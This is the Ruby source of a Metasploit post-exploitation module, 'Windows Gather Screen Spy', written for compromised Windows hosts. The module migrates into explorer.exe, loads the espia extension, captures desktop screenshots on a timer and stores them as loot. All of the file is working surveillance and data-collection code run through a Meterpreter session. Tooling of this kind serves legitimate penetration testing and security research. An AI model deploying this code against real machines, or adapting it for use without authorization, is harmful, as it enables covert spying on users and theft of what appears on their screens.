##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rbconfig'

class MetasploitModule < Msf::Post
  def initialize(info={})
    super( update_info(info,
      'Name'           => 'Windows Gather Screen Spy',
      'Description'    => %q{
          This module will incrementally take desktop screenshots from the host. This
        allows for screen spying which can be useful to determine if there is an active
        user on a machine, or to record the screen for later data extraction.

        Note: As of March, 2014, the VIEW_CMD option has been removed in
        favor of the Boolean VIEW_SCREENSHOTS option, which will control if (but
        not how) the collected screenshots will be viewed from the Metasploit
        interface.
        },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Roni Bachar <roni.bachar.blog[at]gmail.com>', # original meterpreter script
          'bannedit', # post module
          'kernelsmith <kernelsmith /x40 kernelsmith /x2E com>', # record/loot support,log x approach, nx
          'Adrian Kubok' # better record file names
        ],
      'Platform'       => ['win'], # @todo add support for posix meterpreter somehow?
      'SessionTypes'   => ['meterpreter']
    ))

    register_options(
      [
        OptInt.new('DELAY', [true, 'Interval between screenshots in seconds', 5]),
        OptInt.new('COUNT', [true, 'Number of screenshots to collect', 6]),
        OptBool.new('VIEW_SCREENSHOTS', [false, 'View screenshots automatically', false]),
        OptBool.new('RECORD', [true, 'Record all screenshots to disk by looting them', true])
      ])
  end

  def view_screenshots?
    datastore['VIEW_SCREENSHOTS']
  end

  def record?
    datastore['RECORD']
  end

  def run
    host = session.session_host
    screenshot = Msf::Config.get_config_root + "/logs/" + host + ".jpg"

    migrate_explorer
    if session.platform !~ /windows/i
      print_error('Unsupported Platform')
      return
    end

    begin
      session.core.use("espia")
    rescue ::Exception => e
      print_error("Failed to load espia extension (#{e.to_s})")
      return
    end

    begin
      count = datastore['COUNT']
      print_status "Capturing #{count} screenshots with a delay of #{datastore['DELAY']} seconds"
      # calculate a sane number of leading zeros to use.  log of x  is ~ the number of digits
      leading_zeros = Math::log10(count).round
      file_locations = []
      count.times do |num|
        select(nil, nil, nil, datastore['DELAY'])
        begin
          data = session.espia.espia_image_get_dev_screen
        rescue Rex::Post::Meterpreter::RequestError => e
          print_error("Error taking the screenshot: #{e.class} #{e} #{e.backtrace}")
          return false
        end
        if data

          if record?
            # let's loot it using non-clobbering filename, even tho this is the source filename, not dest
            fn = "screenshot.%0#{leading_zeros}d.jpg" % num
            file_locations << store_loot("screenspy.screenshot", "image/jpg", session, data, fn, "Screenshot")
          end

          # also write to disk temporarily so we can display in browser.
          # They may or may not have been RECORDed.
          # do this if they have not suppressed VIEW_SCREENSHOT display
          if view_screenshots?
            fd = ::File.new(screenshot, 'wb')
            fd.write(data)
            fd.close
          end

        end

        if view_screenshots?
          screenshot_path = "file://#{screenshot}"
          Rex::Compat.open_browser(screenshot_path)
        end

      end
    rescue IOError, Errno::ENOENT => e
      print_error("Error storing screenshot: #{e.class} #{e} #{e.backtrace}")
      return
    end
    print_status("Screen Spying Complete")
    if file_locations and not file_locations.empty?
      print_status "run loot -t screenspy.screenshot to see file locations of your newly acquired loot"
    end

    if view_screenshots?
      # wait 2 secs so the last file can get opened before deletion
      sleep 2
      vprint_status "Deleting temporary screenshot file: #{screenshot}"
      begin
        ::File.delete(screenshot)
      rescue Exception => e
        print_error("Error deleting the temporary screenshot file: #{e.class} #{e} #{e.backtrace}")
        print_error("This may be due to the file being in use if you are on a Windows platform")
      end
    end

  end

  def migrate_explorer
    pid = session.sys.process.getpid
    session.sys.process.get_processes.each do |p|
      if p['name'] == 'explorer.exe' and p['pid'] != pid
        print_status("Migrating to explorer.exe pid: #{p['pid']}")
        begin
          session.core.migrate(p['pid'].to_i)
          print_good("Migration successful")
          return p['pid']
        rescue
          print_bad("Migration failed")
          return nil
        end
      end
    end
  end
end
